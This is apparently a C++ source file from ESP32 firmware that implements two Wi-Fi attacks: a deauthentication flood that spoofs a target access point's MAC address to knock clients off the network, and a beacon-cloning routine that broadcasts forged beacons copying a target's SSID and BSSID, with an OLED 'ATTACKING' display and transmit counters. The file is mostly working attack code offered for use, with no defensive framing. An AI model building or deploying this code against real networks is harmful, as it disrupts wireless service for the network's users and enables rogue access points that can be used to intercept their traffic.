#include <WiFi.h>
#include <esp_wifi.h>

// 26-byte deauth frame template
const uint8_t deauth_template[] = {
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (AP BSSID - placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID MAC (AP BSSID - placeholder)
  0xf0, 0xff, 
  0x07, 0x00                          // Reason code: Class 3 frame received from nonassociated STA (0x0007)
};

// Minimal Beacon Frame Template
uint8_t beacon_template[] = {
  // Frame Control (0x80: Beacon), Duration
  0x80, 0x00, 0x00, 0x00,
  // Destination MAC (Broadcast)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  // Source MAC (Placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // BSSID MAC (Placeholder)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // Sequence Control
  0x00, 0x00,
  // Timestamp
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  // Beacon Interval (100 TU)
  0x64, 0x00,
  // Capability Info
  0x01, 0x00
};

void parseMacAddress(String macStr, uint8_t* mac) {
  int values[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", 
             &values[0], &values[1], &values[2], 
             &values[3], &values[4], &values[5]) == 6) {
    for (int i = 0; i < 6; ++i) {
      mac[i] = (uint8_t)values[i];
    }
  } else {
    memset(mac, 0, 6);
  }
}

void attackSetup() {
  txAttemptCount = 0;
  txSuccessCount = 0;
  txFailCount = 0;
  txSuccessCounterThisSecond = 0;
  txFps = 0;
  lastAttackSendTime = millis();
  lastFpsUpdateTime = millis();
  
  // Parse MAC
  parseMacAddress(attackTargetMACStr, attackTargetMAC);
  
  // --- INJECTION-READY STATE SETUP ---
  // Step 1: Clean slate
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  // Step 2: STA mode + Promiscuous (proven working config from Test A/E)
  WiFi.mode(WIFI_STA);
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(attackTargetChannel, WIFI_SECOND_CHAN_NONE);
  delay(50);
  
  // --- DEFENSIVE STATE LOGGING ---
  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  bool promiscEnabled = false;
  esp_wifi_get_promiscuous(&promiscEnabled);
  uint8_t primaryChan = 0;
  wifi_second_chan_t secondChan;
  esp_wifi_get_channel(&primaryChan, &secondChan);
  
  Serial.println("\n[TX-SETUP] === INJECTION STATE REPORT ===");
  Serial.printf("[TX-SETUP] WiFi Mode    : %d (1=STA, 2=AP, 3=APSTA)\n", currentMode);
  Serial.printf("[TX-SETUP] Promiscuous  : %s\n", promiscEnabled ? "ENABLED" : "DISABLED");
  Serial.printf("[TX-SETUP] Channel      : %d\n", primaryChan);
  Serial.printf("[TX-SETUP] TX Interface : WIFI_IF_STA\n");
  Serial.printf("[TX-SETUP] Target SSID  : %s\n", attackTargetSSID.c_str());
  Serial.printf("[TX-SETUP] Target MAC   : %s\n", attackTargetMACStr.c_str());
  Serial.println("[TX-SETUP] ================================");
  Serial.flush();
}

void updateTelemetry() {
  unsigned long now = millis();
  if (now - lastFpsUpdateTime >= 1000) {
    txFps = txSuccessCounterThisSecond;
    txSuccessCounterThisSecond = 0;
    lastFpsUpdateTime = now;
  }
}

void renderAttackUI(const char* title) {
  unsigned long now = millis();
  // Throttled OLED Rendering (10 FPS limit)
  static unsigned long lastRenderTime = 0;
  if (now - lastRenderTime >= 100) {
    lastRenderTime = now;
    
    // Render UI — use char buffers instead of String concatenation
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawFrame(0, 0, 128, 14);
    u8g2.drawStr(4, 10, title);
    
    u8g2.setFont(u8g2_font_5x8_tr);
    
    char buf[32];
    snprintf(buf, sizeof(buf), "SSID: %s", attackTargetSSID.c_str());
    u8g2.drawStr(4, 22, buf);
    snprintf(buf, sizeof(buf), "BSSID:%s", attackTargetMACStr.c_str());
    u8g2.drawStr(4, 32, buf);
    snprintf(buf, sizeof(buf), "Chan: %d", attackTargetChannel);
    u8g2.drawStr(4, 42, buf);
    
    // Dynamic dots animation for "ATTACKING"
    static int animState = 0;
    static unsigned long lastAnimTime = 0;
    if (now - lastAnimTime > 250) {
      animState = (animState + 1) % 4;
      lastAnimTime = now;
    }
    char animBuf[16] = "ATTACKING";
    for (int i = 0; i < animState; i++) {
      animBuf[9 + i] = '.';
    }
    animBuf[9 + animState] = '\0';
    u8g2.drawStr(4, 52, animBuf);
    
    snprintf(buf, sizeof(buf), "Tx:%lu Ok:%lu F:%lu (%lu/s)", txAttemptCount, txSuccessCount, txFailCount, txFps);
    u8g2.drawStr(4, 62, buf);
    u8g2.sendBuffer();
  }
}

void deautherAttackLoop() {
  if (!deauthActive) {
    deauthActive = true;
    attackSetup();
    setColor(255, 0, 0); // Red for Deauth
  }
  
  // Build deauth frame
  uint8_t frame[26];
  memcpy(frame, deauth_template, 26);
  memcpy(&frame[10], attackTargetMAC, 6); // Source MAC
  memcpy(&frame[16], attackTargetMAC, 6); // BSSID
  
  // Send packets
  for (int i = 0; i < 5; i++) {
    txAttemptCount++;
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    if (result == ESP_OK) {
      txSuccessCount++;
      txSuccessCounterThisSecond++;
    } else {
      txFailCount++;
    }
    // Log first TX result for diagnostics
    if (txAttemptCount == 1) {
      Serial.printf("[TX-DIAG] First deauth TX result: 0x%x (%s)\n", result, esp_err_to_name(result));
      Serial.flush();
    }
    delay(2);
  }
  
  updateTelemetry();
  renderAttackUI("DEAUTHER ACTIVE");
}

void beaconAttackLoop() {
  if (!beaconActive) {
    beaconActive = true;
    attackSetup();
    setColor(0, 0, 255); // Blue for Beacon Clone
  }
  
  // Build beacon frame dynamically
  // Calculate size: template (36) + SSID ID (1) + SSID Len (1) + SSID length + DS Set (3)
  uint8_t ssidLen = attackTargetSSID.length();
  if (ssidLen > 32) ssidLen = 32;
  
  int frameSize = sizeof(beacon_template) + 2 + ssidLen + 3;
  uint8_t frame[128]; 
  
  memcpy(frame, beacon_template, sizeof(beacon_template));
  memcpy(&frame[10], attackTargetMAC, 6); // Source
  memcpy(&frame[16], attackTargetMAC, 6); // BSSID
  
  int offset = sizeof(beacon_template);
  // SSID Element
  frame[offset++] = 0x00; // SSID Tag
  frame[offset++] = ssidLen;
  memcpy(&frame[offset], attackTargetSSID.c_str(), ssidLen);
  offset += ssidLen;
  
  // DS Set Element (Channel)
  frame[offset++] = 0x03; // DS Parameter Set Tag
  frame[offset++] = 0x01; // Length
  frame[offset++] = attackTargetChannel;
  
  // Send packets
  for (int i = 0; i < 3; i++) {
    txAttemptCount++;
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, offset, false);
    if (result == ESP_OK) {
      txSuccessCount++;
      txSuccessCounterThisSecond++;
    } else {
      txFailCount++;
    }
    // Log first TX result for diagnostics
    if (txAttemptCount == 1) {
      Serial.printf("[TX-DIAG] First beacon TX result: 0x%x (%s)\n", result, esp_err_to_name(result));
      Serial.flush();
    }
    delay(5);
  }
  
  updateTelemetry();
  renderAttackUI("BEACON CLONING");
}
